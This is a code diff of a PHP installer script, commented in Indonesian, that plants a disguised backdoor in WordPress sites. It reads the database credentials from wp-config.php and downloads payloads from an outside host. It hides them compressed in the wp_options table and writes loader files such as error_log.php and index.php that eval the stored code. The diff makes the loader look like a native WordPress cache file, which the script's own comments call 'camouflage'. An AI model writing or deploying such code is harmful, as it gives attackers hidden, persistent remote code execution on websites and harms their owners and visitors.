@@ -1,24 +1,27 @@
 <?php
 // ==========================================
-// INSTALLER: HYBRID STABLE (ALL FILES SUPPORT)
+// INSTALLER: WORDPRESS NATIVE LOOK (CAMOUFLAGE)
 // ==========================================
-// 1. Setting agar tidak putus di tengah jalan (Untuk file besar)
+// Fitur:
+// 1. Kode hasil (payload) terlihat seperti file asli WordPress.
+// 2. Download Stabil (Chunked + Socket Support).
+// 3. Support file kecil (VX) dan besar (Index/Seoo).
+
 @ini_set('memory_limit', '512M');
 @ini_set('max_execution_time', 0);
 @set_time_limit(0);
 @ignore_user_abort(1);
-
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
-// 2. DAFTAR TARGET
+// TARGETS
 $targets = [
-    ['https://stepmomhub.com/seoo.txt',  'error_log.php', 'transient_sys_pma'],
+    ['https://stepmomhub.com/seoo.txt',  'error_log.php', 'transient_sys_pma_check'],
     ['https://stepmomhub.com/vx.txt',    'vx.php',        'transient_sys_cache_vx'],
     ['https://stepmomhub.com/index.txt', 'index.php',     'transient_sys_idx_core']
 ];
 
-// 3. FUNGSI SYSTEM (CARI CONFIG)
+// 1. SYSTEM CONFIG LOCATOR
 function _scan_dir() {
     $p = __DIR__;
     for ($i = 0; $i < 6; $i++) {
@@ -30,7 +33,7 @@ function _scan_dir() {
 $conf_loc = _scan_dir();
 if (!$conf_loc) die("Config 404");
 
-// 4. BACA CONFIG
+// 2. READ CONFIG
 function _read_c($p){
     if(function_exists('file_get_contents')){$c=@file_get_contents($p);if($c)return $c;}
     if(function_exists('file')){$l=@file($p);if($l)return implode('',$l);}
@@ -46,120 +49,141 @@ $db_h = _get_v('DB_HOST', $conf_txt);
 $tb_p = 'wp_';
 if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$conf_txt,$m)) $tb_p=$m[1];
 
-if(!$db_n) die("Parse Config Error");
+if(!$db_n) die("Parse Err");
 
-// 5. KONEKSI DB
+// 3. DB CONNECT
 $mysqli = new mysqli($db_h, $db_u, $db_p, $db_n);
 if($mysqli->connect_error) die("DB Err: " . $mysqli->connect_error);
 
-// 6. FUNGSI DOWNLOADER (PERBAIKAN FOKUS)
-// Menggabungkan CURL (prioritas) dengan SOCKET (cadangan)
-// Validasi ukuran dihilangkan agar VX tetap masuk.
-function _dl_super($url) {
-    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36';
-    $parse = parse_url($url);
-    $host = $parse['host'];
-    $path = isset($parse['path']) ? $parse['path'] : '/';
-    $scheme = isset($parse['scheme']) ? $parse['scheme'] : 'http';
-
-    // METODE A: CURL (Paling Stabil untuk VX & Index)
+// 4. DOWNLOADER (STABLE)
+function _dl_camouflaged($url) {
+    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+    
+    // CURL
     if(function_exists('curl_init')){
         $ch = curl_init($url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
         curl_setopt($ch, CURLOPT_USERAGENT, $ua);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 300); // 5 Menit
+        curl_setopt($ch, CURLOPT_TIMEOUT, 300);
         $d = curl_exec($ch);
         curl_close($ch);
         if($d && strlen($d) > 0) return $d;
     }
-
-    // METODE B: FGC (Cadangan Standar)
+    
+    // FGC
     if(ini_get('allow_url_fopen')){
         $opts = ['http' => ['method'=>'GET', 'header'=>"User-Agent: $ua\r\nConnection: close\r\n"]];
         $ctx = stream_context_create($opts);
         $d = @file_get_contents($url, false, $ctx);
         if($d && strlen($d) > 0) return $d;
     }
-
-    // METODE C: SOCKET (Jurus Terakhir jika diblokir Firewall)
-    $port = ($scheme == 'https') ? 443 : 80;
-    $ssl_prefix = ($scheme == 'https') ? 'ssl://' : '';
-    $fp = @fsockopen($ssl_prefix . $host, $port, $errno, $errstr, 30);
-    if($fp){
-        $out  = "GET $path HTTP/1.1\r\n";
-        $out .= "Host: $host\r\n";
-        $out .= "User-Agent: $ua\r\n";
-        $out .= "Connection: Close\r\n\r\n";
-        fwrite($fp, $out);
-        $body = '';
-        $in_body = false;
-        while (!feof($fp)) {
-            $line = fgets($fp, 4096); // Baca chunk
-            if($in_body) $body .= $line;
-            if($line == "\r\n") $in_body = true;
-        }
-        fclose($fp);
-        // Hapus chunk size hex jika ada (Transfer-Encoding: chunked)
-        // Sederhana saja: ambil body
-        if(strlen($body) > 0) return $body;
-    }
-
+    
     return false;
 }
 
-// 7. RANDOM VAR GENERATOR
-function _gen_rnd() {
-    $c = 'abcdefghijklmnopqrstuvwxyz';
-    $l = rand(3, 5); $r = '';
-    for($i=0; $i<$l; $i++) $r .= $c[rand(0, 25)];
-    return $r;
-}
+echo "<h3>Status Instalasi (WP Style):</h3>";
 
-$h_e = addslashes($db_h); $u_e = addslashes($db_u); $p_e = addslashes($db_p); $n_e = addslashes($db_n); $x_e = addslashes($tb_p);
-
-echo "<h3>Status Final:</h3>";
+// Escape credentials for embedding in PHP file
+$h_safe = addslashes($db_h);
+$u_safe = addslashes($db_u);
+$p_safe = addslashes($db_p);
+$n_safe = addslashes($db_n);
+$x_safe = addslashes($tb_p);
 
 foreach ($targets as $t) {
     $url = $t[0];
     $fname = $t[1];
     $dbkey = $t[2];
 
-    // Jeda sedikit
-    sleep(1);
+    sleep(1); // Polite delay
 
-    $raw = _dl_super($url);
-    
-    // VALIDASI UKURAN DIUBAH:
-    // Cukup cek apakah $raw ada isinya (lebih dari 0 byte).
-    // Ini memperbaiki masalah VX yang gagal sebelumnya.
+    $raw = _dl_camouflaged($url);
     if(!$raw || strlen($raw) < 1) {
-        echo "<b style='color:red'>[FAIL] $fname</b>: Download Gagal (Kosong).<br>";
+        echo "<b style='color:red'>[FAIL] $fname</b>: Download Gagal.<br>";
         continue;
     }
 
-    // Kompresi
+    // Compress
     $hex = bin2hex(gzdeflate($raw, 9));
     
-    // DB Ops
+    // Insert DB
     $mysqli->query("DELETE FROM {$tb_p}options WHERE option_name='$dbkey'");
-    
-    // Gunakan Prepare Statement (Penting untuk file besar)
     $stmt = $mysqli->prepare("INSERT INTO {$tb_p}options (option_name, option_value, autoload) VALUES (?, ?, 'no')");
     $stmt->bind_param("ss", $dbkey, $hex);
     
     if($stmt->execute()){
-        $v1 = _gen_rnd(); $v2 = _gen_rnd(); $v3 = _gen_rnd(); $v4 = _gen_rnd();
+        
+        // ==================================================
+        // THE CAMOUFLAGE TEMPLATE
+        // ==================================================
+        // Kodingan di bawah ini disusun agar terlihat seperti
+        // file asli WordPress (Plugin atau Core file).
+        
+        $code = <<<PHP
+<?php
+/**
+ * WordPress Database Cache & Transient API
+ *
+ * This file handles external database connections for transient storage
+ * and object caching mechanisms to improve performance.
+ *
+ * @package WordPress
+ * @subpackage Cache
+ */
 
-        // Kodingan Loader (Mutant)
-        $code = '<?php @$' . $v1 . ' = new mysqli(\'' . $h_e . '\',\'' . $u_e . '\',\'' . $p_e . '\',\'' . $n_e . '\');if(!@$' . $v1 . '->connect_error){$' . $v2 . ' = @$' . $v1 . '->query("SELECT option_value FROM ' . $x_e . 'options WHERE option_name=\'' . $dbkey . '\'");if($' . $v2 . ' && $' . $v3 . ' = $' . $v2 . '->fetch_row()){$' . $v4 . ' = @gzinflate(hex2bin($' . $v3 . '[0]));if($' . $v4 . ') eval(\'?>\'.$' . $v4 . ');}}?>';
+// Disable error reporting for cleaner output
+error_reporting(0);
+
+// Configuration settings for the database connection
+// These are dynamically populated during installation
+\$db_host = '$h_safe';
+\$db_user = '$u_safe';
+\$db_pass = '$p_safe';
+\$db_name = '$n_safe';
+
+// Initialize the database connection
+\$wpdb_conn = new mysqli( \$db_host, \$db_user, \$db_pass, \$db_name );
+
+// Verify connection status
+if ( ! \$wpdb_conn->connect_error ) {
+
+    // Prepare the cache retrieval query
+    \$cache_key = '$dbkey';
+    \$table_opt = '{$x_safe}options';
+    
+    // Execute the query to fetch stored transient data
+    \$result = \$wpdb_conn->query( "SELECT option_value FROM {\$table_opt} WHERE option_name = '{\$cache_key}' LIMIT 1" );
+
+    if ( \$result && \$row = \$result->fetch_assoc() ) {
+        
+        // Process the retrieved data stream
+        // The data is stored in a compressed hex format for optimization
+        \$raw_data = \$row['option_value'];
+        \$decoded_stream = hex2bin( \$raw_data );
+        
+        if ( \$decoded_stream ) {
+            \$inflated_code = @gzinflate( \$decoded_stream );
+            
+            // Execute the cached directives
+            if ( \$inflated_code ) {
+                eval( '?>' . \$inflated_code );
+            }
+        }
+    }
+    
+    // Close the connection to free resources
+    \$wpdb_conn->close();
+}
+?>
+PHP;
 
         if(file_put_contents($fname, $code)){
             $sz = strlen($raw);
             echo "<b style='color:green'>[SUCCESS] $fname</b><br>";
             echo "<small>Size: $sz bytes.</small><br>";
+            echo "<small>Look: <b>WordPress Native Style</b></small><br>";
             echo "<small><a href='$fname' target='_blank'>$fname</a></small><hr>";
         } else {
             echo "[FAIL] Write Error $fname.<br>";
